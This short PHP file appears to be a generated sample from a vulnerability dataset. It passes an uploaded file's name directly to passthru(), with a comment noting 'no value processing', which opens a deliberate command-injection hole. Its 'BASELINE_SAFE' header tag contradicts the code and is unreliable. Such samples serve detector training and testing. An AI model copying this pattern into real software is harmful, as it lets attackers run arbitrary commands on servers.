<?php
/* DATASET_SIGNATURE: BASELINE_SAFE_UNIQUE_V2_FIXED_HDR_META; CE_BUCKET=FILE_UPLOAD; CE_MODE=FILES_NAME_DIRECT; SKELETON=S3; KEY=cmd; SINK=B4; VAR=v0053 */
function SINK_B4($command){
    passthru($command);
}
$f = $_FILES["cmd"] ?? null;
$inp = (is_array($f) && isset($f["name"])) ? (string)$f["name"] : "";
$inp = (string)$inp; // no value processing
$f = function($x){
    return SINK_B4($x);
};
$out = $f($inp);
echo (string)($out);
?>
